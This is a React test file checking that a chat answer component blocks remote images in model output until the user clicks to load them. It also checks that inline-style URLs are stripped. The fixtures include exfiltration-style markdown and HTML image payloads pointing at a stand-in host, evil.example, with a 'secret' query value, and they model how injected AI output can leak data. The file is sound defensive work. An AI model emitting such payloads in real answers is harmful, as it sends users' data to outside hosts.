import React from 'react';
import { describe, it, expect, afterEach } from 'vitest';
import { render, screen, fireEvent, cleanup } from '@testing-library/react';
import { Theme } from '@radix-ui/themes';
import { AnswerContent } from '../answer-content';

// Real i18n: `answer-content` pulls in `lib/i18n`, so these assert the en-US strings.
afterEach(() => cleanup());

const h = React.createElement;
const EVIL = 'https://evil.example/p?d=secret';

function renderAnswer(content: string, isStreaming = false) {
  return render(h(Theme, null, h(AnswerContent, { content, isStreaming })));
}

const imgSrcs = (root: HTMLElement) =>
  Array.from(root.querySelectorAll('img')).map((i) => i.getAttribute('src'));

describe('AnswerContent — remote images in model output', () => {
  // T24
  it.each([false, true])('does not render a remote markdown image (streaming=%s)', (isStreaming) => {
    const { container } = renderAnswer(`Here you go\n\n![x](${EVIL})\n`, isStreaming);
    expect(imgSrcs(container)).toEqual([]);
    expect(container.innerHTML).not.toContain('<img');
    expect(screen.getByText('Image from evil.example not loaded')).toBeTruthy();
  });

  // T25
  it('renders the image once the user clicks "Load image"', () => {
    const { container } = renderAnswer(`![x](${EVIL})`);
    fireEvent.click(screen.getByRole('button', { name: 'Load image from evil.example' }));
    expect(imgSrcs(container)).toEqual([EVIL]);
  });

  // T26
  it('renders relative, same-origin and data: images directly', () => {
    const dataUri = 'data:image/png;base64,iVBORw0KGgo=';
    const sameOrigin = `${window.location.origin}/api/v1/document/d1/download`;
    const { container } = renderAnswer(
      [
        '![rel](/api/v1/knowledgeBase/stream/record/r1)',
        '',
        `![abs](${sameOrigin})`,
        '',
        `![data](${dataUri})`,
      ].join('\n'),
    );
    expect(imgSrcs(container)).toEqual(['/api/v1/knowledgeBase/stream/record/r1', sameOrigin, dataUri]);
    expect(screen.queryByTestId('remote-image-placeholder')).toBeNull();
  });

  // T27
  it('gives raw HTML <img> (rehypeRaw path) the same placeholder', () => {
    const { container } = renderAnswer(`<p>see <img src="${EVIL}" alt="pixel"></p>`);
    expect(imgSrcs(container)).toEqual([]);
    expect(screen.getByRole('button', { name: 'Load image from evil.example' })).toBeTruthy();
  });

  it('strips inline styles that would fetch a remote URL from raw HTML', () => {
    const { container } = renderAnswer(
      '<span style="background-image:url(https://evil.example/?d=secret)">x</span> <span style="color:red">y</span>',
    );
    expect(container.innerHTML).not.toContain('evil.example');
    expect(container.innerHTML).toContain('color: red');
  });
});
